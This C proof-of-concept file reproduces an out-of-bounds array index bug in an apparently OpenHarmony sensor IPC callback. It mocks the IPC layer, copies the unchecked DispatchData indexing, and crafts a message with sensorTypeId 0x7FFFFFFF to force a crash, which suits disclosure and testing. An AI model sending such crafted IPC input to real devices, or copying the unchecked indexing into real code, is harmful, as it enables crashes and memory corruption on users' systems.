/*
 * PoC: Out-of-Bounds Array Index via Untrusted IPC Data in SensorChannelCallback
 * 
 * Vulnerability: SensorChannelCallback reads len1/len2 from IPC data without
 * bounds validation, then casts the resulting buffer to SensorEvent*. The
 * sensorTypeId field from this untrusted data is used as an array index into
 * g_callbackNodes[] without bounds checking in DispatchData().
 *
 * CWE-125 / CWE-787: Out-of-bounds Read/Write via unchecked array index
 *
 * Trigger path:
 *   IPC dispatch → SensorChannelCallback() → ReadUint32(len1) → ReadBuffer(len1)
 *   → cast to SensorEvent* → DispatchData() → g_callbackNodes[sensorTypeId]
 *
 * The crafted IPC message contains:
 *   - len1 = sizeof(SensorEvent) (so ReadBuffer succeeds)
 *   - eventData = a SensorEvent with sensorTypeId = 0x7FFFFFFF (huge OOB index)
 *   - len2 = 4 (minimal sensor data)
 *   - sensorData = 4 bytes of dummy data
 *
 * Expected behavior: OOB access on g_callbackNodes array, likely SIGSEGV or
 * heap-buffer-overflow detected by ASan.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ========== Minimal type definitions matching OpenHarmony sensor_lite ========== */

#define SENSOR_OK 0
#define SENSOR_ERROR_INVALID_PARAM (-1)
#define SENSOR_TYPE_ID_MAX 16  /* Actual array size in the real code */

/* Matches the real SensorEvent structure */
typedef struct {
    int32_t sensorTypeId;
    int32_t version;
    int64_t timestamp;
    int32_t option;
    int32_t mode;
    uint32_t dataLen;
    uint8_t *data;
} SensorEvent;

typedef void (*RecordSensorCallback)(SensorEvent *event);

typedef struct CallbackNode {
    struct CallbackNode *next;
    RecordSensorCallback callback;
} CallbackNode;

/* The global array that gets indexed OOB */
static CallbackNode g_callbackNodes[SENSOR_TYPE_ID_MAX];

/* Global sensor event buffer (allocated in real code during init) */
static SensorEvent g_sensorEventStorage;
static SensorEvent *g_sensorEvent = &g_sensorEventStorage;

/* ========== IPC Mock: simulates IpcIo with crafted malicious data ========== */

/*
 * We simulate IpcIo as a simple linear buffer with a read cursor.
 * This mimics how the real IPC framework delivers serialized data from
 * a remote (potentially malicious) process.
 */
typedef struct {
    uint8_t *buffer;
    size_t size;
    size_t cursor;
} IpcIo;

typedef int MessageOption;

/* Stub: HILOG macros are no-ops */
#define HILOG_MODULE_APP 0
#define HILOG_DEBUG(mod, fmt, ...) do {} while(0)
#define HILOG_ERROR(mod, fmt, ...) do {} while(0)

/* Mock ReadUint32: reads a uint32_t from the IPC buffer */
static void ReadUint32(IpcIo *data, uint32_t *value)
{
    if (data->cursor + sizeof(uint32_t) <= data->size) {
        memcpy(value, data->buffer + data->cursor, sizeof(uint32_t));
        data->cursor += sizeof(uint32_t);
        printf("[PoC] ReadUint32 -> %u (0x%x)\n", *value, *value);
    } else {
        *value = 0;
    }
}

/* Mock ReadBuffer: returns pointer into IPC buffer of given size */
static const void *ReadBuffer(IpcIo *data, size_t len)
{
    if (len == 0 || data->cursor + len > data->size) {
        return NULL;
    }
    const void *ptr = data->buffer + data->cursor;
    data->cursor += len;
    printf("[PoC] ReadBuffer(size=%zu) -> ptr=%p\n", len, ptr);
    return ptr;
}

/* ========== REAL vulnerable code from sensor_agent_proxy.c ========== */

/* Line 193-206: DispatchData - uses sensorTypeId as array index WITHOUT bounds check */
void DispatchData(SensorEvent *sensorEvent)
{
    printf("[PoC] DispatchData called\n");
    if (sensorEvent == NULL) {
        return;
    }
    int32_t sensorId = sensorEvent->sensorTypeId;
    printf("[PoC] sensorId = %d (array size = %d)\n", sensorId, SENSOR_TYPE_ID_MAX);

    /* TRIGGER: OOB array access - sensorId is attacker-controlled and not bounds-checked.
     * g_callbackNodes has only SENSOR_TYPE_ID_MAX (16) entries, but sensorId can be
     * any int32_t value from the untrusted IPC data. */
    printf("[PoC] About to access g_callbackNodes[%d] — THIS IS OOB!\n", sensorId);

    CallbackNode *node = (CallbackNode *)(g_callbackNodes[sensorId].next);
    while (node != NULL) {
        node->callback(sensorEvent);
        node = (CallbackNode *)(node->next);
    }
}

/* Line 208-240: SensorChannelCallback - the IPC callback entry point */
int32_t SensorChannelCallback(uint32_t code, IpcIo *data, IpcIo *reply, MessageOption option)
{
    printf("[PoC] SensorChannelCallback entered (code=%u)\n", code);
    if (data == NULL) {
        return SENSOR_ERROR_INVALID_PARAM;
    }
    uint32_t len1 = 0;
    ReadUint32(data, &len1);
    /* No bounds check on len1 — attacker controls the size */
    uint8_t *eventData = (uint8_t *)ReadBuffer(data, (size_t)len1);
    uint32_t len2 = 0;
    ReadUint32(data, &len2);
    /* No bounds check on len2 — attacker controls the size */
    uint8_t *sensorData = (uint8_t *)ReadBuffer(data, (size_t)len2);
    if ((eventData == NULL) || (sensorData == NULL)) {
        printf("[PoC] ReadBuffer returned NULL, aborting\n");
        return SENSOR_ERROR_INVALID_PARAM;
    }
    SensorEvent *event = (SensorEvent *)(eventData);
    g_sensorEvent->dataLen = event->dataLen;
    g_sensorEvent->timestamp = event->timestamp;
    g_sensorEvent->mode = event->mode;
    g_sensorEvent->option = event->option;
    g_sensorEvent->sensorTypeId = event->sensorTypeId;
    g_sensorEvent->version = event->version;
    g_sensorEvent->data = sensorData;
    printf("[PoC] Dispatching event with sensorTypeId=%d\n", g_sensorEvent->sensorTypeId);
    DispatchData(g_sensorEvent);
    return SENSOR_OK;
}

/* ========== PoC DRIVER ========== */

int main(void)
{
    printf("[PoC] === Sensor Lite OOB Index PoC ===\n");
    printf("[PoC] Vulnerability: Untrusted sensorTypeId used as array index\n");
    printf("[PoC] Array g_callbackNodes has %d entries\n\n", SENSOR_TYPE_ID_MAX);

    /* Initialize g_callbackNodes to known state */
    memset(g_callbackNodes, 0, sizeof(g_callbackNodes));

    /*
     * Craft a malicious IPC message.
     * Layout:
     *   [uint32_t len1]         = sizeof(SensorEvent) without the pointer (48 bytes)
     *   [SensorEvent eventData] = crafted event with OOB sensorTypeId
     *   [uint32_t len2]         = 4
     *   [uint8_t sensorData[4]] = dummy sensor payload
     *
     * The key attack value: sensorTypeId = 0x7FFFFFFF (far beyond array bounds)
     */

    /* We serialize without the data pointer since it's set separately */
    /* SensorEvent on-wire layout (without trailing pointer): */
    typedef struct {
        int32_t sensorTypeId;
        int32_t version;
        int64_t timestamp;
        int32_t option;
        int32_t mode;
        uint32_t dataLen;
    } SensorEventWire;

    SensorEventWire malicious_event;
    /* OOB index: 0x7FFFFFFF is way beyond SENSOR_TYPE_ID_MAX (16) */
    malicious_event.sensorTypeId = 0x7FFFFFFF;  /* ATTACK VALUE */
    malicious_event.version = 1;
    malicious_event.timestamp = 12345;
    malicious_event.option = 0;
    malicious_event.mode = 0;
    malicious_event.dataLen = 4;

    uint32_t len1 = sizeof(SensorEventWire);
    uint32_t len2 = 4;
    uint8_t sensor_payload[4] = {0xAA, 0xBB, 0xCC, 0xDD};

    /* Total IPC buffer: len1 + eventData + len2 + sensorData */
    size_t total_size = sizeof(uint32_t) + len1 + sizeof(uint32_t) + len2;
    uint8_t *ipc_buffer = (uint8_t *)malloc(total_size);
    if (!ipc_buffer) {
        printf("[PoC] malloc failed\n");
        return 1;
    }

    size_t offset = 0;
    /* Write len1 */
    memcpy(ipc_buffer + offset, &len1, sizeof(uint32_t));
    offset += sizeof(uint32_t);
    /* Write eventData (the malicious SensorEvent) */
    memcpy(ipc_buffer + offset, &malicious_event, sizeof(SensorEventWire));
    offset += len1;
    /* Write len2 */
    memcpy(ipc_buffer + offset, &len2, sizeof(uint32_t));
    offset += sizeof(uint32_t);
    /* Write sensorData */
    memcpy(ipc_buffer + offset, sensor_payload, len2);
    offset += len2;

    printf("[PoC] Crafted IPC buffer: %zu bytes\n", total_size);
    printf("[PoC] Malicious sensorTypeId = 0x%X (%d)\n",
           malicious_event.sensorTypeId, malicious_event.sensorTypeId);
    printf("[PoC] Array bounds = [0, %d)\n\n", SENSOR_TYPE_ID_MAX);

    /* Set up the mock IpcIo structure */
    IpcIo ipc_data;
    ipc_data.buffer = ipc_buffer;
    ipc_data.size = total_size;
    ipc_data.cursor = 0;

    /*
     * Call the public API entry point: SensorChannelCallback
     * In the real system, this is invoked by the IPC framework when a message
     * arrives on the sensor channel. An attacker controlling a compromised
     * sensor service (or performing IPC injection) sends this crafted message.
     */
    printf("[PoC] Calling SensorChannelCallback (simulating IPC dispatch)...\n\n");
    int32_t ret = SensorChannelCallback(0, &ipc_data, NULL, 0);

    /* If we reach here, the OOB access didn't crash (unlikely with ASan) */
    printf("\n[PoC] SensorChannelCallback returned: %d\n", ret);
    printf("[PoC] If no crash occurred, run with ASan to detect the OOB access.\n");
    printf("[PoC] Compile with: gcc -fsanitize=address -g poc.c -o poc\n");

    free(ipc_buffer);
    return 0;
}